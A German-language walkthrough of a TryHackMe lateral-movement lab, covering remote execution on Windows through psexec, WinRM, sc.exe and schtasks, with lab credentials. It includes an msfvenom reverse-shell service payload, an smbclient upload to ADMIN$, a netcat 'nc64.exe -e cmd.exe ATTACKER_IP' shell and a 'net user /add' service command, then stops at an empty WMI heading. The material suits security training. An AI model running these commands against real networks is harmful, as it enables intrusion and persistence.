# Introduction 

In diesem Raum werden wir uns mit lateraler Bewegung beschäftigen, einer Gruppe von Techniken, die von Angreifern verwendet werden, um sich im Netzwerk zu bewegen, während so wenige Alarme wie möglich ausgelöst werden. Wir werden mehrere gängige Techniken kennenlernen, die hierfür in der Praxis verwendet werden, sowie die beteiligten Tools.

Lernziele

    - Vertraut werden mit den lateralen Bewegungstechniken, die von Angreifern verwendet werden.
    
    - Lernen, wie man alternative Authentifizierungsmaterialien verwendet, um sich seitlich zu bewegen.
    
    - Verschiedene Methoden erlernen, um kompromittierte Hosts als Pivot zu verwenden.


Anforderung Ihrer Zugangsdaten

Um einen AD-Angriff zu simulieren, erhalten Sie Ihre ersten AD-Zugangsdaten. Sobald Ihr Netzwerksetup abgeschlossen ist, navigieren Sie auf Ihrem Angriffsrechner zu http://distributor.za.tryhackme.com/creds, um Ihre Zugangsdaten anzufordern. Klicken Sie auf die Schaltfläche "Zugangsdaten erhalten", um Ihre Zugangspaarung zu erhalten, die für den ersten Zugriff verwendet werden kann.

Dieses Zugangspaar gewährt Ihnen SSH-Zugriff auf THMJMP2.za.tryhackme.com. THMJMP2 kann als Sprung-Host in diese Umgebung betrachtet werden und simuliert einen Foothold, den Sie erreicht haben.

Für den SSH-Zugriff können Sie den folgenden Befehl verwenden:

>ssh henry.bird@thmjmp2.za.tryhackme.com

Password ist Changeme123

---

# Moving Through the Network 

### Was ist laterale Bewegung?

Einfach ausgedrückt ist laterale Bewegung die Gruppe von Techniken, die von Angreifern verwendet werden, um sich in einem Netzwerk zu bewegen. Sobald ein Angreifer Zugang zum ersten Rechner eines Netzwerks erhalten hat, ist das Bewegen aus vielen Gründen entscheidend, darunter: 

- Das Erreichen unserer Ziele als Angreifer - Das Umgehen von Netzwerkbeschränkungen 
- Das Etablieren zusätzlicher Einstiegspunkte in das Netzwerk 
- Das Erzeugen von Verwirrung und Vermeiden der Entdeckung.

Während viele Cyber-Kill-Ketten laterale Bewegung als zusätzlichen Schritt in einem linearen Prozess bezeichnen, ist sie tatsächlich Teil eines Zyklus. Während dieses Zyklus verwenden wir alle verfügbaren Anmeldeinformationen, um laterale Bewegungen durchzuführen und Zugang zu neuen Rechnern zu erhalten, wo wir Berechtigungen erhöhen und falls möglich Anmeldeinformationen extrahieren. Mit den neu gefundenen Anmeldeinformationen beginnt der Zyklus erneut.

![alt text](images/image.png)

Normalerweise wiederholen wir diesen Zyklus mehrmals, bevor wir unser endgültiges Ziel im Netzwerk erreichen. Wenn unser erster Einstiegspunkt ein Rechner mit sehr wenig Zugriff auf andere Netzwerkressourcen ist, müssen wir möglicherweise seitlich zu anderen Hosts wechseln, die mehr Berechtigungen im Netzwerk haben.

### A Quick Example

Angenommen, wir führen ein Red-Team-Engagement durch, bei dem unser endgültiges Ziel darin besteht, ein internes Code-Repository zu erreichen, wobei wir unseren ersten Kompromiss im Zielnetzwerk durch eine Phishing-Kampagne erzielt haben. Phishing-Kampagnen sind in der Regel effektiver gegen nicht-technische Benutzer, daher könnte unser erster Zugriff über einen Rechner in der Marketingabteilung erfolgen.

Die Arbeitsstationen im Marketing werden in der Regel durch Firewall-Richtlinien eingeschränkt, um auf kritische Dienste im Netzwerk zuzugreifen, einschließlich administrativer Protokolle, Datenbankports, Überwachungsdienste oder anderer Dienste, die für ihre tägliche Arbeit nicht erforderlich sind, einschließlich Code-Repositories.

Um sensible Hosts und Dienste zu erreichen, müssen wir zu anderen Hosts wechseln und von dort aus zu unserem endgültigen Ziel pivotieren. Zu diesem Zweck könnten wir versuchen, Berechtigungen auf der Marketing-Arbeitsstation zu erhöhen und lokale Benutzerpasswort-Hashes zu extrahieren. Wenn wir einen lokalen Administrator finden, könnte das gleiche Konto auch auf anderen Hosts vorhanden sein. Nachdem wir einige Recherchen angestellt haben, finden wir eine Arbeitsstation mit dem Namen DEV-001-PC. Wir verwenden den Passworthash des lokalen Administrators, um auf DEV-001-PC zuzugreifen und bestätigen, dass sie einem der Entwickler im Unternehmen gehört. Von dort aus ist der Zugriff auf unser Zielcode-Repository möglich.

![alt text](images/image2.png)

Beachten Sie, dass seitliche Bewegungen möglicherweise verwendet werden müssen, um Firewall-Beschränkungen zu umgehen, aber auch hilfreich sind, um eine Entdeckung zu vermeiden. In unserem Beispiel ist es wahrscheinlich wünschenswert, sich über den PC des Entwicklers zu verbinden, auch wenn die Marketing-Arbeitsstation direkten Zugriff auf das Code-Repository hätte. Dieses Verhalten wäre weniger verdächtig aus der Sicht eines Blue-Team-Analysten, der Anmeldeüberwachungsprotokolle überprüft.

### Die Perspektive des Angreifers

Es gibt mehrere Möglichkeiten, wie ein Angreifer seitlich bewegen kann. Der einfachste Weg wäre die Verwendung von Standard-Administrationsprotokollen wie WinRM, RDP, VNC oder SSH, um eine Verbindung zu anderen Maschinen im Netzwerk herzustellen. Dieser Ansatz kann verwendet werden, um das Verhalten regulärer Benutzer einigermaßen zu emulieren, solange eine gewisse Kohärenz beim Planen erhalten bleibt, wo mit welchem Konto verbunden werden soll. Während es üblich sein kann, dass ein Benutzer von IT über RDP auf den Webserver zugreift und unter dem Radar bleibt, muss darauf geachtet werden, keine verdächtigen Verbindungen zu versuchen (z.B. warum verbindet sich der lokale Admin-Benutzer vom Marketing-PC mit DEV-001-PC?).

Angreifer haben heutzutage auch andere Methoden, um seitlich zu bewegen, während sie es etwas schwieriger machen für das Blue Team, effektiv zu erkennen, was passiert. Obwohl keine Technik als unfehlbar angesehen werden sollte, können wir zumindest versuchen, so leise wie möglich zu sein. In den folgenden Aufgaben werden wir uns einige der gängigsten seitlichen Bewegungstechniken ansehen.

### Administratoren und UAC

Bei der Durchführung der meisten der im Raum vorgestellten seitlichen Bewegungstechniken werden hauptsächlich Administratoranmeldeinformationen verwendet. Obwohl man erwarten könnte, dass jedes einzelne Administratorkonto denselben Zweck erfüllen würde, muss ein Unterschied zwischen zwei Arten von Administratoren gemacht werden:

- Lokale Konten, die Teil der lokalen Administratorengruppe sind
- Domänenkonten, die Teil der lokalen Administratorengruppe sind

Die Unterschiede, an denen wir interessiert sind, sind die Einschränkungen, die User Account Control (UAC) über lokale Administratoren auferlegt (mit Ausnahme des Standard-Administrator-Kontos). Standardmäßig können lokale Administratoren keine Verbindung zu einem Rechner herstellen und administrative Aufgaben ausführen, es sei denn, sie verwenden eine interaktive Sitzung über RDP. Windows verweigert jede administrative Aufgabe, die über RPC, SMB oder WinRM angefordert wird, da solche Administratoren mit einem gefilterten Medium-Integritäts-Token angemeldet sind, das verhindert, dass das Konto privilegierte Aktionen ausführt. Das einzige lokale Konto, das volle Berechtigungen erhält, ist das Standard-Administrator-Konto.

Domänenkonten mit lokalen Administrationsberechtigungen unterliegen nicht derselben Behandlung und werden mit vollen administrativen Berechtigungen angemeldet.

Diese Sicherheitsfunktion kann bei Bedarf deaktiviert werden, und manchmal gibt es keinen Unterschied zwischen lokalen und Domänenkonten in der Administratorengruppe. Dennoch ist es wichtig zu beachten, dass einige der seitlichen Bewegungstechniken fehlschlagen könnten, wenn ein nicht standardmäßiger lokaler Administrator verwendet wird, bei dem UAC durchgesetzt wird. Weitere Details zu dieser Sicherheitsfunktion finden Sie [hier](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).

#  Spawning Processes Remotely 

Diese Aufgabe wird die verfügbaren Methoden untersuchen, die ein Angreifer hat, um einen Prozess remote zu starten, was es ihnen ermöglicht, Befehle auf Maschinen auszuführen, für die sie gültige Anmeldeinformationen haben. Jede der diskutierten Techniken verwendet leicht unterschiedliche Möglichkeiten, um denselben Zweck zu erreichen, und einige von ihnen könnten besser für bestimmte Szenarien geeignet sein.

### Psexec

    Ports: 445/TCP (SMB)
    Erforderliche Gruppenmitgliedschaften: Administratoren

Psexec war jahrelang die bevorzugte Methode, wenn es darum ging, Prozesse remote auszuführen. Es ermöglicht einem Administrator-Benutzer, Befehle remote auf jedem PC auszuführen, auf den er Zugriff hat. Psexec ist eines von vielen Sysinternals-Tools und kann [hier](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) heruntergeladen werden.

Die Funktionsweise von psexec ist wie folgt:

- Verbindung zum Admin$-Freigabeordner herstellen und eine Dienst-Binärdatei hochladen. Psexec verwendet psexesvc.exe als Namen.
    
- Verbindung zum Dienstkontroll-Manager herstellen, um einen Dienst mit dem Namen PSEXESVC zu erstellen und auszuführen und die Dienst-Binärdatei mit ```C:\Windows\psexesvc.exe``` zu verknüpfen.
    
- Einige benannte Pipes erstellen, um stdin/stdout/stderr zu handhaben.

![alt text](images/image3.png)

Um psexec auszuführen, müssen wir lediglich die erforderlichen Administrator-Anmeldeinformationen für den Remote-Host und den Befehl, den wir ausführen möchten, angeben (psexec64.exe steht für Ihre Bequemlichkeit unter C:\tools in THMJMP2 zur Verfügung):

>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

### Remote Process Creation Using WinRM

- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Remote Management Users

Windows Remote Management (WinRM) ist ein webbasiertes Protokoll, das verwendet wird, um Powershell-Befehle remote an Windows-Hosts zu senden. Die meisten Windows Server-Installationen haben WinRM standardmäßig aktiviert, was es zu einem attraktiven Angriffsvektor macht.

Um eine Verbindung zu einer entfernten Powershell-Sitzung von der Befehlszeile aus herzustellen, können wir den folgenden Befehl verwenden:

```winrs.exe -u:Administrator -p:Mypass123 -r:target cmd```

Wir können dasselbe auch von Powershell aus erreichen, aber um verschiedene Anmeldeinformationen zu übergeben, müssen wir ein PSCredential-Objekt erstellen:

```bash
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Sobald wir unser PSCredential-Objekt haben, können wir eine interaktive Sitzung mit dem Enter-PSSession-Cmdlet erstellen:

```bash
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell enthält auch das Invoke-Command-Cmdlet, das ScriptBlocks remote über WinRM ausführt. Anmeldeinformationen müssen ebenfalls über ein PSCredential-Objekt übergeben werden:

```bash
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Remotely Creating Services Using sc

    Ports:
        135/TCP, 49152-65535/TCP (DCE/RPC)
        445/TCP (RPC over SMB Named Pipes)
        139/TCP (RPC over SMB Named Pipes)

    Required Group Memberships: Administrators

Windows-Dienste können auch verwendet werden, um willkürliche Befehle auszuführen, da sie einen Befehl ausführen, wenn sie gestartet werden. Obwohl eine Dienstausführbare Datei technisch gesehen von einer regulären Anwendung verschieden ist, wird sie trotzdem ausgeführt und danach fehlschlagen, wenn wir einen Windows-Dienst konfigurieren, um eine beliebige Anwendung auszuführen.

Wir können einen Dienst auf einem entfernten Host mit sc.exe erstellen, einem Standardtool, das in Windows verfügbar ist. Beim Verwenden von sc wird versucht, eine Verbindung zum Dienststeuerungs-Manager (SVCCTL) Remote-Serviceprogramm über RPC auf mehrere Arten herzustellen:

1. Ein Verbindungsversuch wird mit DCE/RPC unternommen. Zunächst wird der Client eine Verbindung zum Endpunkt-Mapper (EPM) auf Port 135 herstellen, der als Katalog verfügbarer RPC-Endpunkte dient und Informationen über das SVCCTL-Serviceprogramm anfordert. Der EPM wird dann mit der IP-Adresse und dem Port antworten, mit dem eine Verbindung zu SVCCTL hergestellt werden soll, der normalerweise ein dynamischer Port im Bereich von 49152-65535 ist.

![alt text](images/image4.png)

2. Wenn die letztere Verbindung fehlschlägt, wird sc versuchen, SVCCTL über SMB-Named Pipes zu erreichen, entweder auf Port 445 (SMB) oder 139 (SMB über NetBIOS).

Wir können einen Dienst namens "THMservice" mit den folgenden Befehlen erstellen und starten:

```bash
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

Der Befehl "net user" wird ausgeführt, wenn der Dienst gestartet wird, und erstellt einen neuen lokalen Benutzer im System. Da das Betriebssystem für das Starten des Dienstes zuständig ist, können Sie die Befehlsausgabe nicht anzeigen.

Um den Dienst zu stoppen und zu löschen, können wir dann die folgenden Befehle ausführen:

```bash
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

### Creating Scheduled Tasks Remotely

Ein weiteres Windows-Feature, das wir nutzen können, sind geplante Aufgaben. Du kannst eine Aufgabe erstellen und ferngesteuert ausführen mit schtasks, das in jeder Windows-Installation verfügbar ist. Um eine Aufgabe mit dem Namen THMtask1 zu erstellen, können wir die folgenden Befehle verwenden:

```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```
Wir setzen den Zeitplan-Typ (/sc) auf ONCE, was bedeutet, dass die Aufgabe nur einmal zum angegebenen Zeitpunkt und Datum ausgeführt werden soll. Da wir die Aufgabe manuell ausführen werden, spielt das Startdatum (/sd) und die Startzeit (/st) sowieso nicht viel Rolle.

Da das System die geplante Aufgabe ausführt, wird uns die Ausgabe des Befehls nicht zur Verfügung stehen, was dies zu einem Blindangriff macht.

Schließlich können wir die geplante Aufgabe mit folgendem Befehl löschen und uns aufräumen:

```bash
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### Let's Get to Work!

Wir verbinden uns per SSH mit der THMJMP2 Maschine und nutzen unsere Credentials von unserem initial foothold. 

>ssh henry.bird@thmjmp2.za.tryhackme.com

Password: Changeme123

Wir haben ausserdem Zugangsdaten von einem "Admin" erhalten, die wir jetzt nutzen werden.

User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever

Wir werden zeigen, wie man diese Anmeldeinformationen verwendet, um seitlich zu THMIIS zu gelangen, indem wir sc.exe verwenden. Sie können gerne auch die anderen Methoden ausprobieren, da sie alle gegen THMIIS funktionieren sollten.

Obwohl wir bereits gezeigt haben, wie man sc verwendet, um einen Benutzer auf einem entfernten System zu erstellen (indem wir net user verwenden), können wir auch jede Binärdatei hochladen, die wir ausführen möchten, und sie mit dem erstellten Dienst verknüpfen. Wenn wir jedoch versuchen, eine Reverse-Shell mit dieser Methode auszuführen, werden wir feststellen, dass die Reverse-Shell sofort nach der Ausführung getrennt wird. Der Grund dafür ist, dass Dienst-Executables sich von Standard-.exe-Dateien unterscheiden und daher nicht-Dienst-Executables fast sofort vom Dienst-Manager beendet werden. Glücklicherweise unterstützt msfvenom das exe-service-Format, das jedes Payload, das wir mögen, in eine voll funktionsfähige Service-Executable einbettet und verhindert, dass sie beendet wird.

Um eine Reverse-Shell zu erstellen, können wir den folgenden Befehl verwenden:

```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o rshell4444.exe
```

Wir werden dann fortfahren und die Anmeldeinformationen von t1_leonard.summers verwenden, um unser Payload auf den ADMIN$-Freigabe Ordner von THMIIS mithilfe von smbclient von unserer AttackBox aus hochzuladen:

```bash
smbclient -c 'put rshell4444.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```
Sobald unsere ausführbare Datei hochgeladen ist, richten wir auf dem Rechner des Angreifers einen Listener ein, um die Reverse-Shell von msfconsole zu empfangen:

Beispiel:
```bash
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
```

Hier ist ein 1-Liner um dasselbe auszuführen:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```
Da sc.exe uns nicht erlaubt, Anmeldeinformationen als Teil des Befehls anzugeben, müssen wir runas verwenden, um eine neue Shell mit dem Zugriffstoken von t1_leonard.summer zu starten. Allerdings haben wir nur SSH-Zugang zur Maschine, daher würden wir, wenn wir etwas wie runas /netonly /user:ZA\t1_leonard.summers cmd.exe versuchen würden, die neue Befehlszeile auf der Benutzersitzung starten, aber keinen Zugriff darauf haben. Um dieses Problem zu überwinden, können wir runas verwenden, um eine zweite Reverse-Shell mit dem Zugriffstoken von t1_leonard.summers zu starten.

```bash
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
Hinweis: Denken Sie daran, dass runas mit der Option /netonly nicht überprüft, ob die angegebenen Anmeldeinformationen gültig sind (weitere Informationen dazu im Raum zur Enumeration von AD), also stellen Sie sicher, dass Sie das Passwort korrekt eingeben. Andernfalls werden später im Raum einige ACCESS DENIED-Fehler angezeigt.

Wir können wie gewohnt die Verbindung zur Reverse-Shell unter Verwendung von nc in unserer AttackBox empfangen:

>nc -lvnp 4443

Danach können wir endlich unseren Service starten um eine Reverse Shell auf Port 4444 zu erreichen:

```bash
sc.exe \\thmiis.za.tryhackme.com create THMservice-4936 binPath= "%windir%\rshell4936.exe" start= auto

sc.exe \\thmiis.za.tryhackme.com start THMservice-4936
```

Stellen Sie sicher, dass Sie den Namen Ihres Dienstes ändern, um Konflikte mit anderen Studierenden zu vermeiden.

# Moving Laterally Using WMI 















